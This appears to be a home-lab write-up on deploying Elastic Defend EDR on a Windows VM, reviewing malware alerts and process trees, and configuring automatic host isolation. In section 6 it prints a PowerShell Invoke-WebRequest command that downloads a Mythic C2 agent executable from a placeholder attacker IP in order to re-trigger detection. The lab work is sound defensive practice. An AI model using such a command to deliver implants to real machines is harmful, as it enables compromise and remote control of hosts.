### 1. Introduction

**Goal:** Install and configure Elastic Defend on a Windows host to observe real-time endpoint telemetry, detect malicious activity, and test response capabilities.

---

### 2. Installing Elastic Defend

**Steps:**

- **Access Integrations:**  
    Click on the hamburger icon, scroll down to **Integrations**, and search for **Elastic Defend**.
    
- **Add Integration:**  
    Select _Add Elastic Defend_, name the integration (**MyDFIR-EDR**), and choose the configuration type — _Complete EDR_ to capture full telemetry.
    
- **Deploy:**  
    After the setup, deploy the configuration by clicking **Save and Continue** followed by **Save and Deploy Changes**.
    
<img width="812" height="783" alt="image" src="https://github.com/user-attachments/assets/69f07478-6ce2-431e-86d6-03211aa65d93" />


---

### 3. Verifying Installation

**Steps:**

- **Check Endpoints:**  
    Go to **Security → Manage → Endpoints** to confirm the Windows host is enrolled and running Elastic Defend.
    
- **Optional Host Isolation:**  
    If a 30-day trial license is active, you can remotely isolate the host. _(This feature isn’t available on the free tier.)_
---

### 4. Testing Elastic Defend

**Steps:**

- **Trigger Detection:**  
    Open the Windows server console and terminate the malicious `mydfir-30.exe` process. Attempt to run the file again to verify whether Elastic Defend blocks it.


- **Confirm Alert:**  
    Check that the EDR triggers a **malware alert** and quarantines the file immediately.
    
<img width="967" height="684" alt="image" src="https://github.com/user-attachments/assets/802fc75b-097a-467e-9bd7-e4d5ac7bb115" />

---

### 5. Viewing Telemetry

**Steps:**

- **Search Malware Events:**  
    Open **Discover** and search for recent malware activity. Adjust the time filter (e.g., _Last 15 minutes_) and sort results by timestamp.
    
- **Review Alert Data:**  
    Inspect the alert fields for details like file path, quarantine location, file name, file owner, and file hash.
    
- **Visualize Process Tree:**  
    Use the process tree to view parent-child relationships and track the execution chain.
    
<img width="517" height="286" alt="image" src="https://github.com/user-attachments/assets/cc6d66fb-dc82-41e8-ac3f-17170092f0cc" />



<img width="960" height="360" alt="image" src="https://github.com/user-attachments/assets/65273c82-1bc4-41ad-8f4b-36ed89808341" />




---

### 6. Configuring Response Actions

**Steps:**

- **Edit Detection Rule:**  
    Open **Detection Rules**, select the relevant malware prevention rule, and click **Edit Rule Settings**.
    
- **Add Response Action:**  
    Configure a response (e.g., host isolation).
    
- **Test Action:**  
    - Re-trigger the malware event and confirm that the response (e.g., isolation) is automatically executed.
    - Try to download the Mythic Agent again. SSH into the Mythic instance and mount the HTTP server again on port 9999.
    - Go to RDP session on Windows VM and open a PowerShell console, if you move up with the arrows you should find the command of **Invoke-WebRequest** and try to download it again (command: `Invoke-WebRequest -Uri http://<MYDFIR-MYTHIC-IP>:9999/mydfir-30.exe -OutFile "C:\Users\Public\Downloads\mydfir-30.exe"`). The EDR reacts and deletes the file immediately.
    - Move to our Endpoints information and click on our Windows VM endpoint. You should see the Isolated tag next to the Healthy one.
    
<img width="1100" height="549" alt="image" src="https://github.com/user-attachments/assets/c5f42ad9-cd3c-4aab-8577-d2787e0fbff3" />


<img width="467" height="78" alt="image" src="https://github.com/user-attachments/assets/d7c84780-10d2-4e20-b991-390ae8f60c0f" />


<img width="1013" height="196" alt="image" src="https://github.com/user-attachments/assets/0fcec5ea-1435-4fec-bd08-fb6b5b24c82f" />


---

### 7. Conclusion

- Elastic Defend successfully detected and blocked the malicious file in real time.
    
- Telemetry provided clear visibility into file and process activity.
    
- Configuring response actions enhances security posture by enabling automated containment.
    
- Even on the free tier, Elastic Defend offers strong detection and alerting capabilities, with advanced features available on trial or paid plans.

**Reference**
https://youtu.be/Ec-Ab8TbJKs?si=3q8KM65SbuYfHdVp
